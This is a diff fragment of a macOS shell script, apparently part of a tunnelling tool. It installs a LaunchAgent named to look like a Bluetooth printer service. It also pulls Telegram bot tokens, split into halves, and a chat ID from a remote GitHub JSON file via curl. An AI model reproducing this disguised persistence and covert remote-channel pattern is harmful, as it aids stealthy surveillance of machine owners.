@@ -14,10 +14,15 @@ if [[ $1 == "I" || $1 == "i" ]]; then
   echo "$PL" >> $HOME/Library/LaunchAgents/com.bluetooth.printerx.plist;
 # launchctl load $HOME/Library/LaunchAgents/com.bluetooth.printerx.plist;
 
-curl -H "Accept: application/json" "$URL" | jq '.some_key'
-TELGRAM_TOKEN__hh_god_bot='xx'
-TELGRAM_TOKEN__xlinx_bot='xx'
-TELGRAM_CHAT_ID=1920849309
+JSON_URL="https://raw.githubusercontent.com/xlinx/TunnelX/refs/heads/main/printerServices/tokenX.json"
+#TELGRAM_TOKEN__hh_god_bot1=curl -H "Accept: application/json" "$JSON_URL" | jq '.TELGRAM_TOKEN__hh_god_bot1'
+#TELGRAM_TOKEN__hh_god_bot2=curl -H "Accept: application/json" "$JSON_URL" | jq '.TELGRAM_TOKEN__hh_god_bot2'
+#TELGRAM_TOKEN__hh_god_bot="$TELGRAM_TOKEN__hh_god_bot1""$TELGRAM_TOKEN__hh_god_bot2"
+
+TELGRAM_TOKEN__xlinx_bot1=`curl -H "Accept: application/json" "$JSON_URL" | jq '.tunnelX1.TELGRAM_TOKEN__xlinx_bot1'`
+TELGRAM_TOKEN__xlinx_bot2=`curl -H "Accept: application/json" "$JSON_URL" | jq '.tunnelX1.TELGRAM_TOKEN__xlinx_bot2'`
+TELGRAM_TOKEN__xlinx_bot="$TELGRAM_TOKEN__xlinx_bot1""$TELGRAM_TOKEN__xlinx_bot2"
+TELGRAM_CHAT_ID=`curl -H "Accept: application/json" "$JSON_URL" | jq '.tunnelX1.TELGRAM_CHAT_ID'`
 
 TOKEN_TELGRAM=$TELGRAM_TOKEN__xlinx_bot
 TOKEN_CHAT_ID=$TELGRAM_CHAT_ID
